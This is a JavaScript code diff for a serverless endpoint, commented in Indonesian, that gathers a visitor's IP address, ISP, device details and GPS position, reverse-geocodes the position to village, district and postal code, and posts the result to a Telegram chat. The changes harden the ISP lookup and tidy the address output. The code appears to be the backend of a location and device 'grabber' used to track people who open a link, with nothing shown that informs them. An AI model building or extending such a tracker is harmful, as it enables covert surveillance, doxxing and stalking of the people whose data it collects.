@@ -1,6 +1,4 @@
-export const config = {
-  runtime: "nodejs"
-};
+export const config = { runtime: "nodejs" };
 
 /* ================= UTIL ================= */
 
@@ -46,7 +44,7 @@ function getPublicIP(req) {
   return ip;
 }
 
-/* ================= IP INFO (MULTI FALLBACK) ================= */
+/* ================= IP INFO (ANTI ISP KOSONG) ================= */
 
 async function getIPInfo(ip) {
   const apis = [
@@ -58,8 +56,7 @@ async function getIPInfo(ip) {
         country: j.country_name,
         region: j.region,
         city: j.city,
-        isp: j.org,
-        postal: j.postal
+        isp: j.org || j.as || j.isp
       };
     },
     async () => {
@@ -70,8 +67,7 @@ async function getIPInfo(ip) {
         country: j.country,
         region: j.region,
         city: j.city,
-        isp: j.isp,
-        postal: j.postal
+        isp: j.isp || j.org
       };
     },
     async () => {
@@ -82,42 +78,75 @@ async function getIPInfo(ip) {
         country: j.country,
         region: j.region,
         city: j.city,
-        isp: j.org,
-        postal: j.postal
+        isp: j.org || j.asn
       };
     }
   ];
 
   for (const api of apis) {
     try {
-      return await api();
+      const d = await api();
+      if (d?.isp) return d; // ⬅️ pastikan ISP ada
     } catch {}
   }
-  return {};
+
+  return { country: "-", region: "-", city: "-", isp: "-" };
+}
+
+/* ================= ADDRESS (INDONESIA NORMALIZED) ================= */
+
+function normalizeIDAddress(addr, ipinfo) {
+  return {
+    village:
+      addr.village ||
+      addr.suburb ||
+      addr.hamlet ||
+      "-",
+
+    district:
+      addr.city_district ||
+      addr.subdistrict ||
+      addr.district ||
+      addr.county ||
+      "-",
+
+    city:
+      addr.city ||
+      addr.town ||
+      addr.municipality ||
+      "-",
+
+    province:
+      addr.state ||
+      ipinfo.region ||
+      "-",
+
+    postal:
+      addr.postcode || "-",
+
+    country:
+      addr.country || ipinfo.country || "-"
+  };
 }
 
 /* ================= HANDLER ================= */
 
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).send("Method Not Allowed");
-  }
+  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");
 
   const BOT_TOKEN = process.env.BOT_TOKEN;
   const CHAT_ID = process.env.CHAT_ID;
-  if (!BOT_TOKEN || !CHAT_ID) {
-    return res.status(500).send("ENV belum diset");
-  }
+  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).send("ENV belum diset");
 
   const input = req.body || {};
   const ip = getPublicIP(req);
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
   /* ===== IP INFO ===== */
-  const ipinfo = ip !== "Unknown" ? await getIPInfo(ip) : {};
+  const ipinfo = ip !== "Unknown" ? await getIPInfo(ip) : { isp: "-" };
 
   /* ===== ADDRESS ===== */
-  let address = {};
+  let rawAddress = {};
   let locationSource = "GPS";
 
   if (input.latitude && input.latitude !== "Not Allowed") {
@@ -127,20 +156,13 @@ export default async function handler(req, res) {
         { headers: { "User-Agent": "LocationBot/1.0" } }
       );
       const geo = await geoRes.json();
-      address = geo.address || {};
+      rawAddress = geo.address || {};
     } catch {}
   } else {
     locationSource = "IP (Approximate)";
-    address = {
-      road: "-",
-      village: "-",
-      suburb: "-",
-      city: ipinfo.city,
-      state: ipinfo.region,
-      postcode: ipinfo.postal,
-      country: ipinfo.country
-    };
   }
+
+  const addr = normalizeIDAddress(rawAddress, ipinfo);
 
   const mapsLink =
     input.latitude && input.latitude !== "Not Allowed"
@@ -154,7 +176,6 @@ export default async function handler(req, res) {
 ━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-📱 Brand        : ${input.brand || "-"}
 🧠 OS           : ${input.os || "-"}
 💻 Platform     : ${input.platform || "-"}
 ⚙️ CPU Cores    : ${input.cpu || "-"}
@@ -178,13 +199,12 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 🏠 *ADDRESS INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-🛣 Street      : ${address.road || "-"}
-🏘 Village     : ${address.village || address.suburb || "-"}
-🏙 District    : ${address.city_district || address.county || "-"}
-🏛 City        : ${address.city || address.town || "-"}
-🌆 Province    : ${address.state || "-"}
-📮 Postal Code : ${address.postcode || "-"}
-🌍 Country     : ${address.country || "-"}
+🏘 Village      : ${addr.village}
+🏙 District     : ${addr.district}
+🏛 City         : ${addr.city}
+🌆 Province     : ${addr.province}
+📮 Postal Code : ${addr.postal}
+🌍 Country     : ${addr.country}
 
 ━━━━━━━━━━━━━━━━━━━━
 📐 *LOCATION QUALITY*
@@ -214,4 +234,4 @@ ${mapsLink}
   } catch {
     return res.status(500).send("Gagal kirim");
   }
-}
+        }
